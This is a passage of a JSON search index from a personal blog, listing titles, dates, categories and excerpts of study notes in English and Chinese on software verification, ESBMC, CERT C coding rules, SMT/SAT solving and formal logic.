[{"title":"Detection of Software Vulnerabilities: Static Analysis","date":"2022-05-05T12:30:25.000Z","path":"posts/536aff33/","slug":"Detection-of-Software-Vulnerabilities-Static-Analysis","permalink":"https://hejueyun.github.io/posts/536aff33/","excerpt":"1. Verification vs Validation Verification: “Are we building the product right?” The software should conform to its specification Validation: “Are we building the right product?” The software should do what the user requires Verification and validation must be applied at each stage in the software process 2. Static and Dynamic Verificationstatic verification aka Software inspections Code analysis can prove the absence of errors but might subject to incorrect results dynamic verification aka Software testing The system is executed with test data Operational behaviour is observed 2.1. The V-model of development","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Fuzzing A Software Verifier - POP","date":"2022-05-02T15:11:23.000Z","path":"posts/a0a87206/","slug":"Fuzzing-A-Software-Verifier","permalink":"https://hejueyun.github.io/posts/a0a87206/","excerpt":"1. IntroductionThe complexity of manually and dynamic testing increases with the growth of the project. This results in the increasing usage of static analysis tools, such as bounded model checker, which do not require compilation and act automatically [1]. As an SMT-based model checker for program static analysis and verification, ESBMC has been successfully used in a variety of environments due to its adaptability to multi-language, multi-platform and high efficiency[2]. However, these features have led to the difficulty of fuzzing this software verifier. Firstly, the construction of a generation-based fuzzer for ESBMC is a challenge. The adaptability for multiple source programming languages means that the fuzzer needs to consider certain source language’s grammar, in the worst case, constructing different inputs for corresponding front-ends. Secondly, the construction of a coverage-guided mutation-based fuzzer is a challenge, as directly generated random input cannot be “understood” by ESBMC and will be excluded beyond validating. These deficiencies will result in fuzzy tests that do not detect errors hidden in the deep execution path of the program and insufficient code coverage. Hence, we propose a fuzzer construction on intermediate representation, which refers to Goto programs. Instead of converting from the source file, this generic fuzzer would generate syntactically correct Goto programs directly. The introduction of mutation will further dynamically modify the properties in the Goto programs by tracking and updating the corpus. These Goto programs will finally be used as input to fuzz test the ESBMC. The achievement of this goal can be divided into the following steps: (1) Summarise the syntax grammar for constructing Goto intermediate representation, including the symbol table and Goto instructions, i.e. each statement in the Goto program, as well as the Goto programs itself. (2) Investigate a mutation approach for the generated Goto programs, which will be achieved by introducing libFuzzer[3]. (3) Design and implement the program architecture of the Goto-fuzzer. (4) Debugging and testing, including error detection and performance testing. (5) Fuzz the ESBMC by Goto-fuzzer. Collect the error logs and coverage information.(6) Analyse the data and draw conclusions. 2. Background2.1. ESBMCESBMC is a licensed open-source SMT-based contextual boundary model checker that has been widely used to verify multi-language programs, including C&#x2F;C++, Java and Solidity. ESBMC can automatically find memory safety and assertion violations[4]. The basic workflow of this bounded model checker begins with a transition system $M$, a property $φ$, and a bound $k$. ESBMC unwinds the system $k$ times and converts it into a verification condition (VC) $ψ$. ESBMC checks the negation of this VC so that $ψ$ is satisfiable if and only if $φ$ has a counterexample of depth $k$ or less. To cope with increasing software complexity, sorts of SMT (Satisfiability Modulo Theories) solvers have been used as the back-end of ESBMC for solving the generated VCs[5]. From an architectural point of view, ESBMC can be divided into three components: front-end, middleware and back-end. A C++ Oriented ESBMC structure can been shown by Figure 1. FIGURE 1 C++ oriented ESBMC's architecture overview. White rectangles represent input and output; grey rectangles represent the steps of the verification 2.1.1. Front-end","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"ESBMC","slug":"Security/ESBMC","permalink":"https://hejueyun.github.io/categories/Security/ESBMC/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"ESBMC Symbol Table","date":"2022-04-22T20:06:36.000Z","path":"posts/1ad13e77/","slug":"ESBMC-Symbol-Table","permalink":"https://hejueyun.github.io/posts/1ad13e77/","excerpt":"1. Namespacet A namespacet is essentially one or two symbol tables bound together, to allow for symbol lookups in them. The basic idea is that you might want to combine a value table and a type table, so that for a variable you can lookup both of these essential properties, in one structure. 2. contextt123symbol_base_mapt symbol_base_map;symbolst symbols;ordered_symbolst ordered_symbols; 3. symbolt&#x2F;symbolst GOTO conversion component constructs a goto-program from a symbol table. Each symbol in the symbol table with function type (that is, the symbol’s type field contains a code_typet) will be converted to a corresponding GOTO program. Function goto_convertt::convert turns each codet in the symbol table into corresponding GOTO instructions.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"ESBMC","slug":"Security/ESBMC","permalink":"https://hejueyun.github.io/categories/Security/ESBMC/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"GOTO Language Syntax Grammar","date":"2022-04-22T20:05:04.000Z","path":"posts/d48bdd8/","slug":"GOTO-Language-Syntax-Grammar","permalink":"https://hejueyun.github.io/posts/d48bdd8/","excerpt":"1. Expression From the aspect of goto program, an expression (expr2t) is formed by two properties: expr_type (type2t): represents the type of an expression. expr_ids (expr_ids): used for distinguishing different classes of expression 12expr ::= expr_type + expr_ids | expr expr_type 12345678910111213141516expr_type ::= | bool_id | empty_id | symbol_id | struct_id | union_id | code_id | array_id | pointer_id | unsignedbv_id | signedbv_id | fixedbv_id | floatbv_id | string_id | cpp_name_id | end_type_id expr_ids 12345678910111213141516expr_ids ::= | constant_int_id | constant_fixedbv_id | constant_floatbv_id | constant_bool_id | constant_string_id | constant_struct_id | constant_union_id | constant_array_id | constant_array_of_id ... | code_block_id | code_assign_id | code_init_id ... | end_expr_id 2. Goto InstructionIn ESBMC, a goto instruction (goto_programt::instructiont) is defined by three properties– The meaning of an instruction depends on the instruction_type (goto_program_instruction_typet) field, while different kinds of instructions make use of the fields guard (expr2tc) and code (expr2tc) for different purposes. In other words, these are the properties that need to be considered when initialising a goto-instruction data structure, any other property could be set default or generated afterwards. expr2tc is basically a reference pointer container for expr2t. In this situation, there is no need to distinguish these two. The syntax grammar can be roughly listed as follows. 1234Instruction ::= | (instruction_type) | (instruction_type, guard) | (instruction_type, code) instruction_type: an enum value describing the action performed by this instruction. 1234567891011121314151617181920instruction_type ::= | NO_INSTRUCTION_TYPE | GOTO | ASSUME | ASSERT | OTHER | SKIP | LOCATION | END_FUNCTION | ATOMIC_BEGIN | ATOMIC_END | RETURN | ASSIGN | DECL | DEAD | FUNCTION_CALL | THROW | CATCH | THROW_DECL | THROW_DECL_END code: represents the code expression whose id is a subset of expr_ids: 123456789101112131415161718192021code.ids ::= | code_block_id | code_assign_id | code_init_id | code_decl_id | code_dead_id | code_printf_id | code_expression_id | code_return_id | code_skip_id | code_free_id | code_goto_id | code_asm_id | code_function_call_id | code_comma_id | code_cpp_del_array_id | code_cpp_delete_id | code_cpp_catch_id | code_cpp_throw_id | code_cpp_throw_decl_id | code_cpp_throw_decl_end_id guard: an (arbitrarily complex) expression (usually an exprt) of Boolean type, whose id is a subset of expr_ids. 12345guard.id ::= | constant_bool_id | constant_int_id | constant_floatbv_id | constant_fixedbv_id","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"ESBMC","slug":"Security/ESBMC","permalink":"https://hejueyun.github.io/categories/Security/ESBMC/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"ESBMC-An Efficient SMT-based Software Model Checker","date":"2022-04-20T20:02:42.000Z","path":"posts/2f42f06c/","slug":"ESBMC-An-Efficient-SMT-based-Software-Model-Checker","permalink":"https://hejueyun.github.io/posts/2f42f06c/","excerpt":"1. Introduction It(ESBMC) does not require any special annotations in the source code to find such bugs, but it allows users to add their assertions and checks if they hold. In addition, ESBMC implements a k-induction proof rule and can be used to prove the absence of property violations (resp. the validity of user-defined assertions) 它（ESBMC）不需要在源代码中进行任何特殊的注释来发现这种错误，但它允许用户添加他们的断言并检查它们是否成立。此外，ESBMC实现了一个k-归纳证明规则，可以用来证明没有违反属性（即用户定义的断言的有效性） 2. ESBMC Architecture One of the significant challenges in software verification is the development and maintenance of an infrastructure that can reliably and efficiently handle real-world programs; it is an issue that only intensifies given the ever-evolving programming language standards. 新标准发布需要新的支持 2.1. Front-end an important piece of technology that should facilitate the transition between the program under verification and a format the tool can work upon 2.1.1. ClangClang是LLVM编译器的c-family前端，Clang可能意指三种不同的实体： 前端（在Clang库中实现） 编译器驱动程序（在clang命令和Clang驱动程序库中实现） 实际的编译器（在clang -cc1命令中实现）。clang -cc1中的编译器不仅是由Clang库实现，还广泛地使用其他LLVM库来实现编译器的中端、后端以及集成的汇编器。 clang -emit-llvm -c size.c -o size.bc","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"ESBMC","slug":"Security/ESBMC","permalink":"https://hejueyun.github.io/categories/Security/ESBMC/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"软件安全备忘录：CERT C Coding Standard笔记","date":"2022-04-08T20:29:29.000Z","path":"posts/e8d0ec3/","slug":"CERT-C-Coding-Standard笔记","permalink":"https://hejueyun.github.io/posts/e8d0ec3/","excerpt":"1. Expressions (EXP)1.1. EXP30-C. Do not depend on the order of evaluation for side effects At specific points during execution, known as sequence points, all side effects of previous evaluations are complete, and no side effects of subsequent evaluations have yet taken place. Do not depend on the order of evaluation for side effects unless there is an intervening sequence point 1234/* i is modified twice between sequence points */ i = ++i + 1;/* i is read other than to determine the value to be stored */ a[i++] = i; Attempting to modify an object multiple times between sequence points may cause that object to take on an unexpected value, which can lead to unexpected program behavior 1.1.1. 副作用 在产生一个值的过程中，表达式可能会对环境做出其他改变，这样的改变被称为副作用(side effect)，诸如变量的值被修改，或者输入输出流的数据有所变化 表达式x + 1;就产生了一个值，但是它没有产生一个副作用 表达式x = x+ 3;产生了一个值，同时也会产生一个副作用 1.2. EXP32-C. Do not access a volatile object through a nonvolatile reference","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"软件安全备忘录：Mem Management","date":"2022-04-01T11:56:49.000Z","path":"posts/de2aa2c7/","slug":"软件安全备忘录：Mem-Management","permalink":"https://hejueyun.github.io/posts/de2aa2c7/","excerpt":"1. risk assessment CERT C Coding Standard contains a risk assessment section 1.1. Severity 严重性 How serious are the consequences of the rule being ignored Value Meaning Examples of Vulnerabilities 1 low Denial-of-service attack, abnormal termination 2 medium Data integrity violation, unintentional information disclosure 3 high Run arbitrary code 1.2. Likelihood 可能性 How likely is it that a flaw introduced by ignoring the rule can lead to an exploitable vulnerability Value Meaning 1 Unlikely 2 Probable 3 likely 1.3. Detection and Correction 检测和纠正 How will we cope with detection and correction","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Bounded Model Checking","date":"2022-03-30T22:02:54.000Z","path":"posts/ade5e95e/","slug":"Bounded-Model-Checking笔记","permalink":"https://hejueyun.github.io/posts/ade5e95e/","excerpt":"1. Circuit Satisfiability problem 由此引入了Formula Satisfiability The SAT problem asks whether a given Boolean formula is satisfiable The SMT decides the satisfiability of first-order logic formulae using the combination of different background theories 2. BMCBMC: 有界模型检测","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"ESBMC","slug":"Security/ESBMC","permalink":"https://hejueyun.github.io/categories/Security/ESBMC/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-一阶逻辑-SMT","date":"2022-03-10T16:05:21.000Z","path":"posts/39d160ca/","slug":"计算机数理逻辑-SMT","permalink":"https://hejueyun.github.io/posts/39d160ca/","excerpt":"1. SAT vs SMT 布尔可满足性问题 vs 可满足性模理论 SMT将SAT推广到涉及 实数 、 整数 和&#x2F;或各种 数据结构 （如 列表 、 数组 、 位向量 和 字符串 由于布尔可满足性已经是 NP 完全的，所以 SMT 问题通常是 NP困难的 ，并且对于许多理论来说它是 不可判定(nondeterministic) SMT是指另外一类公式的可满足性判定问题。这一类公式具有两个特点： 在命题逻辑公式里面混入了一些一阶逻辑表达式 具有任意的布尔结构 SAT solvers are automatic and efficient However, systems are usually designed and modeled at a higher level than the Boolean level and the translation to Boolean logic can be expensive. A primary goal of research in Satisfiability Modulo Theories (SMT) is to create verification engines that can reason natively at a higher level of abstraction, while still retaining the speed and automation of today’s Boolean engines SMT Solver &#x3D; SAT Solver + Theory Solver 2. Solver vs Checker In model checking, you have a model and a specification (or property), and you check if the model meets the specification. In SAT solving, you have a formula and you try to find a satisfying assignment to it.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-一阶逻辑-归结","date":"2022-03-06T21:08:15.000Z","path":"posts/e24b211f/","slug":"计算机数理逻辑-一阶逻辑-归结","permalink":"https://hejueyun.github.io/posts/e24b211f/","excerpt":"1. atom vs literal vs term a: $p$ 在一阶逻辑下得到扩展 l: $p$ $\\lnot{p}$ 注意扩展到命题逻辑中时，$P$就可以带上函数和谓词 In propositional calculus a literal is simply a propositional variable or its negation. In predicate calculus a literal is an atomic formula or its negation, where an atomic formula is a predicate symbol applied to some terms, ${\\displaystyle P(t_{1},\\ldots ,t_{n})}$ with the terms recursively defined starting from constant symbols, variable symbols, and function symbols. For example, ${\\displaystyle \\neg Q(f(g(x),y,2),x)}$ is a negative literal with the constant symbol 2, the variable symbols x, y, the function symbols f, g, and the predicate symbol Q. t: $p$ $f^{n}$ $a$ 2. 合一 Unification Let s and t be two terms (or atoms), A unifier of s and t is a substitition σ that makes the two identical, formally sσ &#x3D; tσ 2.1. 最一般的合一 Most general unifierσ is a most general unifier of s and t, denoted mgu(s, t), if σ is a unifier of s and t and for any other unifier θ of s and t, there is a substitution ρ such that σρ &#x3D; θ 2.2. Unifiers and most general unifiers, in general","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-程序验证-协议安全分析","date":"2022-03-03T12:53:42.000Z","path":"posts/fa02fe64/","slug":"计算机数理逻辑-程序验证-协议安全分析","permalink":"https://hejueyun.github.io/posts/fa02fe64/","excerpt":"1. The Neuman-Stubblebine key exchange protocol 1.1. breaking The intruder now sends a message to B, and the message will make B believe it’s actually from A. Thus B will start to use the wrong key, i.e. an insecure key. 入侵者现在向B发送一个信息，这个信息将使B相信它实际上来自A，因此B将开始使用错误的密钥，即一个不安全的密钥。 2. Verification of security protocols using resolution The idea is that the security property says an unsafe state is possible Since first-order logic is not decidable, there is however no guarantee that the saturation will terminate when the security property does not hold. Non-termination can therefore indicate the existence of a potential attack on the protocol. 3. Assumptions in security protocol analysis","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-一阶逻辑-逻辑编程","date":"2022-02-25T22:58:44.000Z","path":"posts/faaea58c/","slug":"计算机数理逻辑-一阶逻辑-逻辑编程","permalink":"https://hejueyun.github.io/posts/faaea58c/","excerpt":"Resolution was originally developed as a method for automatic theorem proving. Later, it was discovered that a restricted form of resolution can be used for programming a computation. This approach is called logic programming. A program is expressed as a set of clauses A query is expressed as an additional clause that can clash冲突 with one or more of the program clauses. The query is assumed to be the negation of result of the program. If a refutation succeeds, the query is not a logical consequence of the program, so its negation must be a logical consequence. 解析最初是作为一种自动定理证明的方法而开发的。后来，人们发现，一种受限制的决议形式可以用于计算的编程。这种方法被称为逻辑编程。 一个程序被表达为一组子句 一个查询被表达为一个额外的子句，可以与一个或多个程序子句发生冲突。查询被认为是对程序结果的否定。如果反驳成功，查询不是程序的逻辑结果，所以它的否定必须是一个逻辑结果 1. From Formulas in Logic to Logic Programmingprogram clauses 按我的理解就是霍恩子句 goal clause Suppose now that we have a set of program clauses and we want to prove that some formula: $G_1\\land{}…\\land{}G_n$ is a logical consequence of the set. This can be done by taking the negation of the formula: $\\lnot{}G_1\\lor{}…\\lor{}\\lnot{}G_n$ and refuting it by resolution with the program clauses The formula $¬ G_1∨⋯∨¬ G_n$ , called a goal clause, consists entirely of negative literals, so it can only clash on the single positive literal of a program clause","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-时序逻辑-语法与语义","date":"2022-02-24T13:30:06.000Z","path":"posts/150c47ae/","slug":"计算机数理逻辑-时序逻辑-语法与语义","permalink":"https://hejueyun.github.io/posts/150c47ae/","excerpt":"1. Introduction Temporal logic is a formal system for reasoning about time. Temporal logic has found extensive application in computer science, because the behavior of both hardware and software is a function of time. Temporal logics are related to formal systems called modal logics. Modal logics express the distinction between what is necessarily true and what is possibly true. For example, the statement ‘7 is a prime number’ is necessarily true because—given the definitions of the concepts in the statement—the statement is true always and everywhere. In contrast, the statement the head of state of this country is a king is possibly true, because its truth changes from place to place and from time to time. Temporal logic and modal logic are related because ‘always’ is similar to ‘necessarily’ and ‘eventually’ to ‘possibly’. 时间逻辑与称为模态逻辑的形式系统有关。模态逻辑表达了什么是必然真实和什么是可能真实之间的区别。例如，”7是质数 “这个陈述必然是真实的，因为–考虑到陈述中概念的定义–这个陈述总是真实的，而且无处不在。相比之下，这个国家的国家元首是国王的说法可能是真的，因为它的真理在不同的地方和不同的时间会发生变化。时间逻辑和模态逻辑是相关的，因为 “总是 “类似于 “必然”，”最终 “类似于 “可能”。 时间逻辑与模态逻辑相似，只是状态被认为是指定在某一特定时间点上的真实情况，而转换则定义了时间的流逝 2. PTL2.1. Syntax The syntax of propositional temporal logic (PTL) is defined like the syntax of propositional logic, except for the addition of two additional unary operators: □ , read always ◊ , read eventually $(¬ ◊p)∧(□¬ q)$ the temporal operators and negation have higher precedence优先权 than the conjunction operator 2.2. semantic Informally, □ is a universal operator meaning ‘for any time t in the future’, while ◊ is an existential operator meaning ‘for some time t in the future’ 2.3. transition diagram 状态转换图","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-程序验证-并发程序","date":"2022-02-23T01:15:37.000Z","path":"posts/cf619a86/","slug":"计算机数理逻辑-程序验证-并发程序","permalink":"https://hejueyun.github.io/posts/cf619a86/","excerpt":"Verification is routinely used when developing computer hardware and concurrent programs. A sequential program can always be tested and retested, but the nondeterministic nature of hardware and concurrent programs limits the effectiveness of testing as a method to demonstrate that the system is correct. Slight variations in timing, perhaps caused by congestion on a network, mean that two executions of the same program might give different results. Even if a bug is found by testing and then fixed, we have no way of knowing if the next test runs correctly because we fixed the bug or because the execution followed a different scenario, one in which the bug cannot occur. 在开发计算机硬件和并发程序时，经常会用到验证。一个顺序程序总是可以被测试和重新测试，但硬件和并发程序的非确定性限制了测试作为证明系统正确的方法的有效性。时间上的微小变化，也许是由网络上的拥堵造成的，意味着同一个程序的两次执行可能会得到不同的结果。即使通过测试发现了一个错误，然后进行了修复，我们也没有办法知道下一次测试的正确运行是因为我们修复了这个错误，还是因为执行了一个不同的场景，在这个场景中，这个错误不会发生 顺序程序的验证貌似没有用到时态逻辑 1. Concurrent Program 并发程序 A concurrent program is a set of sequential programs together with a set of global variables A concurrent program is a set of processes ${ p_1,p_2,…,p_n }$, where each process is a sequential program Processes are also known as threads; in some contexts, the two terms have different meanings but the difference is not relevant here 进程与线程在此处无需区别 The variables declared in each process are its local variables; a local variable can be read and written only by the process where it is declared. There may be global variables that can be read and written by all of the processes. 1.1. state 状态 The state of a concurrent programs consists of the values of its variables (both local and global), together with the location counters of its processes. Example There are $5×3×3&#x3D;45$ different states, because the variable n can have the values $0, 1, 2, 3, 4$ and there are three labels for each process. These seems like quite a large number of states for such a simple program, but many of the states (for example, (0,end,end)) will never occur in any computation.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-程序验证-顺序程序","date":"2022-02-23T01:15:14.000Z","path":"posts/ab706956/","slug":"计算机数理逻辑-程序验证-序列程序","permalink":"https://hejueyun.github.io/posts/ab706956/","excerpt":"1. Program A computer program is not very different from a logical formula. It consists of a sequence of symbols constructed according to formal syntactical rules and it has a meaning which is assigned by an interpretation of the elements of the language. In programming, the symbols are called statements or commands and the intended interpretation is the execution of the program on a computer. The syntax of programming languages is specified using formal systems such as BNF, but the semantics is usually informally specified. 一个计算机程序与一个逻辑公式没有什么不同。它由一连串的符号组成，这些符号是根据正式的句法规则构建的，它有一个意义，这个意义是通过对语言元素的解释而赋予的。在编程中，这些符号被称为语句或命令，预期的解释是程序在计算机上的执行。编程语言的语法是用BNF这样的形式化系统指定的，但语义通常是非正式地指定的 1.1. 考虑一门语言的设计 A program is a statement S, where statements are defined recursively using the concepts of variables and expressions 程序本身就是一个抽象的大statement A statement in a programming language can be considered to be a function that transforms the state of a computation 编程语言可以被视作状态转换函数 Let $S$ be a program with $n$ variables $(x1,…,xn)$. A state $s$ of $S$ consists of an $n+1$-tuple of values $(lc,x_1,…,x_n )$, where $lc$ is the value of the location counter(sometimes called the instruction pointer，存储下一个指令的地址) and $x_i$ is the value of the variable $xi$. we aim to verify the program by proving: if the input to the program satisfies the precondition, then the output of the program will satisfy the postcondition example If the variables (x,y) have the values (8,7) in a state, then the result of executing the statement x &#x3D; 2*y+1 is the state in which (x,y)&#x3D;(15,7) and the location counter is incremented","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"academic writing-Literature Review","date":"2022-02-22T22:23:20.000Z","path":"posts/dd5e4fc6/","slug":"academic-writing-Literature-Review","permalink":"https://hejueyun.github.io/posts/dd5e4fc6/","excerpt":"1. What is literature Published written works (publications) Unpublished written works 2. Why literature review First step of research Help you obtain background knowledge Identify related work to yours Understand the state of the art尖端技术 in your project area To frame your arguments and research questions based on the state-of-the-art Identify knowledge gaps or limitations in your project area 3. Where to find publications ACM Digital Library (https://dl.acm.org/) hosts ACM Journals and ACM Conference Proceedings IEEE Xplore (https://ieeexplore.ieee.org/) hosts IEEE Journals and IEEE Conference Proceedings SpringerLink (https://link.springer.com/) hosts Springer Journals (including Nature) and Springer Conference Proceedings ScienceDirect (https://www.sciencedirect.com/) hosts Elsevier Journals and e-books Wiley Online Library (https://onlinelibrary.wiley.com/) hosts Wiley Journals and e-books Google Scholar (https://scholar.google.com/) – Web search engine for scholarly literature 4. How to do literature review Systematic literature review (SLR) methods Traditional SLR Snowballing 4.1. Traditional SLR 使用由一组关键词组成的搜索字符串 对每一个已知的数字图书馆进行详尽的搜索 旨在选择所有相关的论文 耗费时间，而且作为个人很难做到这一点","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"计算机数理逻辑-一阶逻辑-项与范式","date":"2022-02-18T15:27:40.000Z","path":"posts/bb11e25b/","slug":"计算机数理逻辑-一阶逻辑-4","permalink":"https://hejueyun.github.io/posts/bb11e25b/","excerpt":"1. Terms 项 Variables. Any variable, constant or 0-ary function symbol is a term. Functions. Any expression $f(t_1,…,t_n)$ of n arguments (where each argument $t_i$ is a term and $f$ is a function symbol of valence n) is a term. In particular, symbols denoting individual constants are nullary function symbols, and thus are terms. Only expressions which can be obtained by finitely many applications of rules 1 and 2 are terms 2. prenex conjunctive normal form(PCNF) 前束范式 A formula is in prenex conjunctive normal form (PCNF) iff it is of the form: $Q_1x_1…Q_nx_nM$ where the $Q_i$ are quantifiers and $M$ is a quantifier-free formula in CNF. The sequence $Q_1x_1⋯Q_nx_n$ is the prefix and $M$ is the matrix 如果一个公示可以被写为量词在前，随后是被称为母体的无量词部分，则称其为前束范式的，所有经典逻辑公式都逻辑等价于某个前束范式公式 example Let A be a closed formula in PCNF whose prefix consists only of universal quantifiers. The clausal form of A consists of the matrix of A written as a set of clauses 所以上个例子可以写为：","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-一阶逻辑-演绎","date":"2022-02-18T15:11:01.000Z","path":"posts/f450749c/","slug":"计算机数理逻辑-一阶逻辑-3","permalink":"https://hejueyun.github.io/posts/f450749c/","excerpt":"1. Deductive system1.1. G We extend the deductive systems $G$ and $H$ from propositional logic to first-order logic by adding axioms and rules of inference for the universal quantifier全称量词. 1.2. H The rules of inference are modus ponens and generalization The Deduction Rule：","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-一阶逻辑-语法与语义","date":"2022-02-15T23:57:35.000Z","path":"posts/ed4b45dd/","slug":"计算机数理逻辑-一阶逻辑-2","permalink":"https://hejueyun.github.io/posts/ed4b45dd/","excerpt":"1. 引入命题逻辑对于算术等数学理论的形式化来说，表现力并不充分。一个算术表达式，如$x+2&gt;y-1$，既不是真的，也不是假的。 它的真假取决于变量x和y的值 我们需要将运算符+和-的含义形式化，作为将一对数字映射为一个数字的函数 像&gt;这样的关系运算符必须被形式化为将一对数字映射为真值 2. 命题逻辑vs一阶逻辑 命题逻辑（Propositional Logic） 形如 ¬P，P∧Q，P∨Q，P → Q ，P↔Q的语句，值为True或者False 推理规则较简单，往往通过（1.真值表 2.为数不多的推理规则，例如Modus ponesn等几个） 缺点：不能或者很难表示复杂的语句，不能记录推理过程中的变化 一阶逻辑（First Order Logic），简称FOL 包含的东西有常量（Constant symbol），谓词符号（Predicate symbol），函数符号（Function symbol），变量（Variable），连词（ ∧∨→↔），量词（Quantifiers, ∃∀） 命题逻辑(很少部分人叫它作零阶逻辑). 在命题逻辑里, 每一个字母就代表一个命题, 所以命题逻辑只能表达句子之间的关系, 比如“p&amp;q”, “if p then q”等等的真值如何从p和q的真值中计算出来. 一阶逻辑则引入了两个量词, 即universal quantifier(倒A)和existential quantifier(倒E), 并且加入了一阶谓词和individual variables和individual constants. 这些导致一阶逻辑可以量化individuals in the domain. 比如经典的三段论就可以被一阶逻辑表达 1234567For all x, Hx-&gt;MxHs----Ms 2.1. vs Propositional Logic vs Set Theory vs Elementary Number TheoryPropositional Logic Equality: no Predicate symbols: A1, A2, . . . Constant symbols: none Function symbols: none Set Theory Equality: yes Predicate symbols: ∈ Constant symbols: ∅ Function symbols: none","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Automated Reasoning","slug":"Security/Automated-Reasoning","permalink":"https://hejueyun.github.io/categories/Security/Automated-Reasoning/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"计算机数理逻辑-命题逻辑-SAT","date":"2022-02-15T17:31:21.000Z","path":"posts/f363d9fd/","slug":"计算机数理逻辑-命题逻辑-4","permalink":"https://hejueyun.github.io/posts/f363d9fd/","excerpt":"1. SAT 布尔可满足性问题 可满足性（英语：Satisfiability）是用来解决给定的真值方程式，是否存在一组变量赋值，使问题为可满足。布尔可满足性问题（Boolean satisfiability problem；SAT ）属于决定性问题，也是第一个被证明属于NP完全的问题 决定性问题，亦称判定问题，（英语：Decision problem）是一个在某些形式系统回答“是”或“否”的问题 2. Properties of Clausal Form A computer program that searches for a model for a propositional formula is called a SAT Solver. Let S, S′ be sets of clauses. S≈S′ denotes that S is satisfiable if and only if S′ is satisfiable. It is important to understand that S≈S′ does not imply that S≡S′ (S is logically equivalent to S′) 2.1. Pure Literals Let S be a set of clauses. A pure literal in S is a literal l that appears in at least one clause of S, but 